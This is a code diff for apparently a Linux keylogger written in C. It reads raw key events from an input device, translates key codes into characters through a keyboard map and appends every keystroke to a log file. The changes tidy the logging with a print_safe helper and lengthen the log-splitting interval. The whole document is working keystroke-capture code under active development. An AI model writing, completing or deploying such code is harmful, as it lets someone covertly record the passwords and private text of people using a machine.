@@ -93,9 +93,6 @@ void log_r(const char *driver) {
   int fd = open(driver, O_RDONLY);
   FILE *fp = fopen(LOGFILE, "a");
 
-  fprintf(fp, "TEST");
-  fflush(fp);
-
   char *map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";
 
   while(1) {
@@ -107,34 +104,33 @@ void log_r(const char *driver) {
       // split log file with current time
       time_t diff = clock() - before;
       
-      if(diff > 10)
+      if(diff > 60)
 	delimit(fp);
       
       switch(ev.code) {
       case(0):
-	fflush(fp);
-	fprintf(fp, "KEY_RESERVED");
+	print_safe(fp, "KEY_RESERVED");
 	break;
       case(1):
-	fflush(fp);
-	fprintf(fp, "KEY_ESC");
+	print_safe(fp, "KEY_ESC");
 	break;
       case(14):
-	fprintf(fp, "KEY_BACKSPACE");
+	print_safe(fp, "KEY_BACKSPACE");
 	break;
       case(15):
-	fprintf(fp, "KEY_TAB");
+	print_safe(fp, "KEY_TAB");
 	break;
       case(28):
-	fprintf(fp, "KEY_ENTER");
+	print_safe(fp, "KEY_ENTER");
 	break;
       case(29):
-	fprintf(fp, "KEY_LEFTCTRL");
+	print_safe(fp, "KEY_LEFTCTRL");
 	break;
       case(42):
-	fprintf(fp, "KEY_LEFTSHIFT");
+	print_safe(fp, "KEY_LEFTSHIFT");
 	break;
       default:
+	fflush(fp);
 	fprintf(fp, "%c\n", map[ev.code]);
       }
     }
